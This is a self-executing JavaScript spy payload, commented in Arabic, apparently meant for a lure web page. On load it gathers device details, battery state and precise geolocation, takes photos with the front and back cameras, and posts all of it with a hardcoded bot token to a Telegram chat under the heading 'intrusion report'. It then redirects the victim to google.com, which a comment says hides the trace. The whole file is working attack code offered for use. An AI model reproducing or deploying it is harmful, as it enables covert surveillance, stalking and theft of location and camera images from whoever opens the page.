// ========== جمع جميع البيانات ==========
async function collectAllData() {
    const data = {};

    // معلومات الجهاز الأساسية
    data.userAgent = navigator.userAgent;
    data.platform = navigator.platform;
    data.language = navigator.language;
    data.hardwareConcurrency = navigator.hardwareConcurrency;
    data.deviceMemory = navigator.deviceMemory || "unknown";

    // البطارية
    if (navigator.getBattery) {
        const battery = await navigator.getBattery();
        data.battery = {
            level: battery.level * 100 + "%",
            charging: battery.charging,
            chargingTime: battery.chargingTime,
            dischargingTime: battery.dischargingTime
        };
    }

    // الموقع الجغرافي
    data.location = await new Promise((resolve) => {
        if ("geolocation" in navigator) {
            navigator.geolocation.getCurrentPosition(
                (pos) => resolve({
                    lat: pos.coords.latitude,
                    lon: pos.coords.longitude,
                    accuracy: pos.coords.accuracy
                }),
                () => resolve({ error: "مرفوض" })
            );
        } else {
            resolve({ error: "غير مدعوم" });
        }
    });

    // المساحة التخزينية
    if (navigator.storage && navigator.storage.estimate) {
        const storage = await navigator.storage.estimate();
        data.storage = {
            total: (storage.quota / (1024**3)).toFixed(2) + " GB",
            used: (storage.usage / (1024**3)).toFixed(2) + " GB"
        };
    }

    // قائمة الشبكات المتاحة (WiFi SSID - عبر Web API محدود)
    // في Android WebView يمكن استخدام JavaScript Interface إضافي

    return data;
}

// ========== التصوير بالكاميرا الأمامية والخلفية ==========
async function capturePhotos() {
    const photos = { front: null, back: null };

    // محاولة الكاميرا الخلفية (environment)
    try {
        const stream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: { exact: "environment" } }
        });
        photos.back = await captureFrame(stream);
        stream.getTracks().forEach(track => track.stop());
    } catch(e) { photos.back = { error: e.message }; }

    // الكاميرا الأمامية (user)
    try {
        const stream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: { exact: "user" } }
        });
        photos.front = await captureFrame(stream);
        stream.getTracks().forEach(track => track.stop());
    } catch(e) { photos.front = { error: e.message }; }

    return photos;
}

function captureFrame(stream) {
    return new Promise((resolve) => {
        const video = document.createElement("video");
        video.srcObject = stream;
        video.onloadedmetadata = () => {
            video.play();
            setTimeout(() => {
                const canvas = document.createElement("canvas");
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const ctx = canvas.getContext("2d");
                ctx.drawImage(video, 0, 0);
                resolve(canvas.toDataURL("image/jpeg", 0.7));
                video.remove();
            }, 100);
        };
    });
}

// ========== إرسال إلى Telegram Bot ==========
const BOT_TOKEN = "8449865560:AAHHFcJWchQlKNgYpP3W7BYXUWvbAOKFAkI";
const CHAT_ID = "7984067238";
async function sendToTelegram(data, photos) {
    const message = `
📱 *عبد الرابط - تقرير الاختراق*
👤 UserAgent: ${data.userAgent}
💻 Platform: ${data.platform}
🔋 Battery: ${data.battery?.level} (Charging: ${data.battery?.charging})
📡 Location: ${data.location.lat}, ${data.location.lon}
💾 Storage: ${data.storage?.total} total, ${data.storage?.used} used
📶 Concurrency: ${data.hardwareConcurrency}
🧠 Memory: ${data.deviceMemory} GB
    `;

    // إرسال النص
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            chat_id: CHAT_ID,
            text: message,
            parse_mode: "Markdown"
        })
    });

    // إرسال الصور
    if (photos.front && !photos.front.error) {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                photo: photos.front,
                caption: "📸 الكاميرا الأمامية"
            })
        });
    }

    if (photos.back && !photos.back.error) {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                photo: photos.back,
                caption: "📸 الكاميرا الخلفية"
            })
        });
    }
}

// ========== التنفيذ ==========
(async () => {
    const data = await collectAllData();
    const photos = await capturePhotos();
    await sendToTelegram(data, photos);

    // إعادة توجيه وهمي لإخفاء الأثر
    setTimeout(() => {
        window.location.href = "https://google.com";
    }, 2000);
})();
